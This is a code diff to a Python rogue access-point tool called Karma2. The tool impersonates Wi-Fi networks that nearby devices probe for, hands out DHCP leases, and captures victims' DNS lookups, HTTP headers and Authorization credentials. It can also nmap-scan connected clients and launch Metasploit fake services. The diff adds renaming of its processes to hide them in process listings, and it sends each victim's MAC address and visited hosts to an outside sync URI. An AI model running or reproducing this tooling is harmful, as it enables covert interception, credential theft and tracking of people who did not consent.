@@ -13,7 +13,6 @@ import urllib2
 import json
 import base64
 
-
 DEFAULT = '\033[49m\033[39m'
 RED = '\033[91m'
 BRED = '\033[101m'
@@ -26,6 +25,22 @@ YELLOW = '\033[93m'
 
 def _ctxt(txt,color):
   return ''.join((color,txt,DEFAULT))
+
+
+try:
+  from prctl import set_name as prctl_set_name
+  from prctl import get_name as prctl_get_name
+except ImportError:
+  prctl_set_name = lambda x:None
+  prctl_get_name = lambda :""
+
+def set_title(name):
+  """ Set the process name shown in ps, proc, or /proc/self/cmdline """
+  prctl_set_name(name)
+
+def get_title():
+  """ Get the process name shown in ps, proc or /proc/self/cmdline """
+  return prctl_get_name()
 
 
 def parse_args():
@@ -42,6 +57,7 @@ def parse_args():
     parser.add_argument("-s", "--scan", action='store_true', help="run nmap on each new device")
     parser.add_argument("-x", "--management", help="deploy a management AP on this interface")
     parser.add_argument("-d", "--debug", action='store_true', help="debug mode")
+    parser.add_argument("-u", "--uri", help="wifiScanMap sync uri")
     return parser.parse_args()
 
 class Karma2:
@@ -50,20 +66,26 @@ class Karma2:
 
   class Webserver(Thread):
     daemon=True
-    def __init__(self, port = 80):
+    def __init__(self, app, port = 80):
       Thread.__init__(self)
+      self.app = app
       self.port = port
 
     def run(self):
+      set_title('webserver')
       print "run server"
       server_class=Karma2.HTTPServer
       handler_class=Karma2.HTTPRequestHandler
       server_address = ('', self.port)
-      httpd = server_class(server_address, handler_class)
+      httpd = server_class(server_address, self.app, handler_class)
       httpd.serve_forever()
 
   class HTTPServer(BaseHTTPServer.HTTPServer):
-    pass
+    allow_reuse_address = True
+    
+    def __init__(self, server_address, app, RequestHandlerClass, bind_and_activate=True):
+      BaseHTTPServer.HTTPServer.__init__(self, server_address, RequestHandlerClass, bind_and_activate)
+      self.app = app
 
   class HTTPRequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
     
@@ -89,12 +111,26 @@ class Karma2:
       client = self.client_address[0]
       path,params,args = self._parse_url()
       host = self.headers.get('Host')
+      dns = {
+        'bssid': self.server.app.get_client_bssid(client),
+        'host': host
+        }
+      self.server.app.update_dns(dns)
       fullpath =  "%s/%s"%(host,path)
+      essid = ""
+      try:
+        essid = self.server.app.get_client_ap(client).essid
+      except:
+        pass
 
-      print "%s: %s => %s"%(_ctxt("HTTP",BLUE),client,fullpath)
+      print "%s %s: %s => %s"%(essid,_ctxt("HTTP",BLUE),client,fullpath)
       for k in self.headers:
         print "%s> %s:%s"%(_ctxt(" |\\--",BLUE),k,self.headers.get(k))
       
+      if self.headers.get('user-agent') is not None:
+          #self.headers.get('user-agent')
+          pass
+
       http_auth = self.headers.get('Authorization')
       if http_auth is not None:
         params = http_auth.split(' ')
@@ -215,11 +251,10 @@ class Karma2:
       self.timeout = timeout
       self.wpa2 = wpa2
       self.ifhostapd = ifhostapd
-      self.nclients = 0
       self.unused = True
       self.activity_ts = time.time()
       self.logfile = None
-
+      self.clients = {}
       iface,self.hostapd_process = self.create_hostapd_access_point(essid, bssid, wpa2)
       subnet = self.karma.get_unique_subnet()
       self.subnet = subnet
@@ -238,10 +273,7 @@ class Karma2:
         # redirect the following ports
         for sport, dport in self.karma.redirections.iteritems():
           self.setup_redirections(iface,sport,dport)
-        
         self.dnswatch_process = self.start_dnswatch(iface)
-        if self.karma.tcpdump:
-          self.start_tcp_dump()
 
       else:
         self.dnswatch_process = None
@@ -254,19 +286,41 @@ class Karma2:
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE)
       return p
-
+              
+    
+    def register_client(self, mac,ip, name = ""):
+      if not self.clients.has_key(mac):
+        self.clients[mac] = ip
+        print "new client %s (%s) %s"%(mac, _ctxt(ip, GREEN), name)
+        if self.karma.scan:
+          try:
+            self.nmaps.append(self.nmap(ip))
+          except:
+            print "%s Unable to start nmap %s"%(_ctxt("[!]",RED))
+    
     def run(self):
+      set_title('hostapd %s'%self.essid)
       print "[+] now running"
+      
       while True:
 
         def _killall():
-          self.dhcpd_process.kill()
-          self.dhcpd_process.wait()
-          self.hostapd_process.kill()
-          self.hostapd_process.wait()
+          try:
+            self.dhcpd_process.kill()
+            self.dhcpd_process.wait()
+          except:
+            print "%s could not kill dhcpd"%_ctxt("[!]",RED)
+          try:
+            self.hostapd_process.kill()
+            self.hostapd_process.wait()
+          except:
+            print "%s could not kill hostapd"%_ctxt("[!]",RED)
           if self.tcpdump_process is not None:
-            self.tcpdump_process.kill()
-            self.tcpdump_process.wait()
+            try:
+              self.tcpdump_process.kill()
+              self.tcpdump_process.wait()
+            except:
+              print "%s could not kill tcpdump"%_ctxt("[!]",RED)
             if self.karma.tcpdump and self.unused and not self.karma.debug:
               try:
                 print "[-] deleteting %s"%self.logfile
@@ -275,8 +329,11 @@ class Karma2:
                 print "%s error deleteting %s"%((_ctxt("[!]",RED)), self.logfile)
                 pass
           if self.dnswatch_process is not None:
-            self.dnswatch_process.kill()
-            self.dnswatch_process.wait()
+            try:
+              self.dnswatch_process.kill()
+              self.dnswatch_process.wait()
+            except:
+              print "%s could not kill dnswatch"%_ctxt("[!]",RED)
           
           for p in self.nmaps:
             p.kill()
@@ -293,7 +350,7 @@ class Karma2:
           return
 
         # check timeout
-        if self.nclients == 0 and time.time() - self.activity_ts > self.timeout:
+        if time.time() - self.activity_ts > self.timeout:
           print "[x] No activity for essid",self.essid,"destroying AP"
           _killall()
           return
@@ -312,49 +369,42 @@ class Karma2:
         else:
           dnswfd = -1
         
-        nmapsd = []
-        for n in self.nmaps:
-          nmapsd.append(n.stdout.fileno())
-        files.extend(nmapsd)
+        #nmapsd = []
+        #for n in self.nmaps:
+          #nmapsd.append(n.stdout.fileno())
+        #files.extend(nmapsd)
         rlist,wlist,xlist = select(files,[],[],1)
-        i = 0
-        for n in nmapsd:
-          if n in rlist:
-            line = self.nmaps[i].stdout.readline()
-            if len(line) == 0:
-              continue
-            print line
-          i += 1
+        #i = 0
+        #for n in nmapsd:
+          #if n in rlist:
+            #line = self.nmaps[i].stdout.readline()
+            #if len(line) == 0:
+              #continue
+          #i += 1
           
         if dhcpfd in rlist:
           line = self.dhcpd_process.stderr.readline()
           if len(line) == 0:
-            continue
+              continue
+          #print line
           m = re.match(
             r".*failed.*", line)
           if m is not None:
             print "%s %s"%(_ctxt("[!]",RED), line)
-            _killall()
-            return
+            #_killall()
+
           
           m = re.match(
             r".*DHCPACK\(\w+\) ([0-9\.]+) ([a-zA-Z0-9:]+) ([\w-]+).*",line)
           if m is not None:
             ip,mac,name = m.groups()
-            print "DHCPACK from %s (%s)"%(_ctxt(ip, GREEN),name)
-            if self.karma.scan:
-              try:
-                self.nmaps.append(self.nmap(ip))
-              except:
-                print "%s Unable to start nmap %s"%(_ctxt("[!]",RED))
-            self.nclients += 1
-            self.unused = False
+            self.register_client(mac, ip, name)
           m = re.match(
             r".*([a-zA-Z0-9:]+)*disassociated due to inactivity*",line)
           if m is not None:
             mac = m.groups()
             print "dissociated %s"%mac
-            self.nclients -= 1
+            self.clients.pop(mac,None)
 
         if airfd in rlist:
           line = self.hostapd_process.stdout.readline()
@@ -363,7 +413,8 @@ class Karma2:
           m = re.match(r".*: STA ([a-zA-Z0-9:]+) IEEE 802.11: authenticated",line)
           if m is not None:
             mac, = m.groups()
-            print "Client %s associated to %s"%(_ctxt(mac,GREEN),_ctxt(self.essid,GREEN))
+            if not self.clients.has_key(mac):
+              print "Client %s associated to %s"%(_ctxt(mac,GREEN),_ctxt(self.essid,GREEN))
 
             self.activity_ts = time.time()
 
@@ -372,15 +423,37 @@ class Karma2:
             ifname, = m.groups()
             print "%s Unable to start hostapd on interface %s"%(_ctxt("[!]",RED),_ctxt(ifname,RED))
             # will remove AP from list on next check
-            self.activity_ts = None
+            self.activity_ts = None  
 
         if dnswfd in rlist:
           line = self.dnswatch_process.stdout.readline()
           if len(line) == 0:
             continue
+          dns = {}
           # only show requests
-          if "A?" in line or "AAAA?" in line or "CNAME" in line:
-            print "DNS: %s"%(_ctxt(line.strip(),RED))
+          if "CNAME" in line:
+            m = re.match(
+            r".* > (\w+:\w+:\w+:\w+:\w+:\w+).*CNAME*\s([a-z0-9-\.]+)\..*",line)
+            if m is not None:
+              mac,host = m.groups()
+              dns = {
+                'bssid': mac,
+                'host': host
+                }
+          
+          if "AAAA?" in line or "A?" in line:
+            m = re.match(
+            r"(\w+:\w+:\w+:\w+:\w+:\w+) >.*length \d+:\s([0-9\.]+)\.\d+.*A\?*\s([a-z0-9-\.]+)\..*",line)
+            if m is not None:
+              mac, ip, host = m.groups()
+              dns = {
+                'bssid': mac,
+                'host': host
+                }
+              self.register_client(mac,ip)
+          if dns != {}: 
+            if self.karma.update_dns(dns):
+              print "[+] %s => %s"%(dns['bssid'], dns['host'])
 
           self.activity_ts = time.time()
 
@@ -441,7 +514,7 @@ class Karma2:
       p.wait()
 
     def start_dnswatch(self, iface):
-      cmd = ["tcpdump","-i",iface,"-s0","-l","-t","-n","udp","port","53"]
+      cmd = ["tcpdump","-i",iface,"-e","-s0","-l","-t","-n","udp","port","53"]
       p = subprocess.Popen(cmd,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE)
@@ -459,8 +532,6 @@ class Karma2:
         f.write("bssid=%s\n"%(bssid))
       f.write("interface=%s\n"%(interface))
       f.write("channel=%s\n"%(channel))
-      f.write("logger_stdout=-1\n")
-      f.write("logger_stdout_level=0")
       #f.write("ignore_broadcast_ssid=1")
       if wpa2 is not None:
         f.write("wpa=2\n")
@@ -469,7 +540,6 @@ class Karma2:
         f.write("wpa_pairwise=CCMP\n")
         f.write("rsn_pairwise=CCMP\n")
       f.close()
-
       cmd = ["hostapd","-d",f.name]
       p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
       return interface,p
@@ -490,7 +560,7 @@ class Karma2:
           iface, = m.groups()
           return iface,p
 
-  def __init__(self, ifgw, ifmon, ifhostapds = None, metasploit = None, tcpdump = None, redirections = None, offline = False, scan = False, debug = False):
+  def __init__(self, ifgw, ifmon, ifhostapds = None, metasploit = None, tcpdump = None, redirections = None, offline = False, scan = False, debug = False, uri = None):
     self.ifmon = ifmon
     self.ifgw = ifgw
     self.ifhostapds = Karma2.WLANInterfaces(ifhostapds)
@@ -501,6 +571,7 @@ class Karma2:
     self.tcpdump = tcpdump
     self.scan = scan
     self.debug = debug
+    self.uri = uri
 
     if not offline:
       self.setup_nat(ifgw)
@@ -514,7 +585,27 @@ class Karma2:
         
     if metasploit is not None:
       self.start_metasploit(metasploit)
-    
+  
+  def get_client_ap(self,ip):
+    for essid,ap in self.aps.iteritems():
+      for m,c in ap.clients.iteritems():
+        if c == ip:
+          return ap
+
+  def get_client_bssid(self, ip):
+    for essid,ap in self.aps.iteritems():
+      for m,c in ap.clients.iteritems():
+        if c == ip:
+          return m
+  
+  def update_dns(self, dns):
+    try:
+      req = urllib2.Request('%s/users.json'%self.uri)
+      req.add_header('Content-Type', 'application/json')
+      response = urllib2.urlopen(req, json.dumps(dns, ensure_ascii=False))
+    except:
+      print "could not update dns"
+  
   def start_metasploit(self, console):
     print "[+] Starting metasploit"
     cmd = [console,'-r', 'run_fake_services.rb']
@@ -611,8 +702,8 @@ class Karma2:
       
       sniff(prn=_filter,store=0)
 
-  def start_webserver(self, port):
-    ws = Karma2.Webserver(port)
+  def start_webserver(self, km, port):
+    ws = Karma2.Webserver(km, port)
     ws.start()
 
 
@@ -656,10 +747,10 @@ if __name__ == '__main__':
   try:
     args.hostapds = args.hostapds.split(',')
 
-    km = Karma2(args.gateway, args.monitor, args.hostapds, args.framework, args.tcpdump, args.redirections, args.offline, args.scan, args.debug)
+    km = Karma2(args.gateway, args.monitor, args.hostapds, args.framework, args.tcpdump, args.redirections, args.offline, args.scan, args.debug, args.uri)
 
     if args.offline:
-      km.start_webserver(km.redirections[80])
+      km.start_webserver(km, km.redirections[80])
 
     if args.name is not None:
       # 24h timeout
